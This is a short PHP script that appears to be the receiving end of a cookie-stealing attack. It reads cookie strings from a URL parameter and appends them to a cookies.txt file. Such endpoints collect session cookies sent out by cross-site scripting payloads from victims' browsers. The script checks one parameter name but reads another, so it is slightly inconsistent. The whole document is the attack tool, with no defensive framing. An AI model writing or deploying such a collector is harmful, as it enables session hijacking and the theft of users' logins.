<?php

#If the GET variable cookiess is set run this code
if(isset($_GET['cookies'])) {

   #Seperate each cookie into an array
   $cookies = explode(' ', $_GET['c']);

   #Open file in append mode
   $fp = fopen('cookies.txt', 'a');

   #Write cookies to file
   foreach($cookies as $cookie) {
      fwrite($fp, $cookie . "\r\n");
   }

   #Close file pointer and clear variables
   fclose($fp);
   unset($cookies);
}

?>
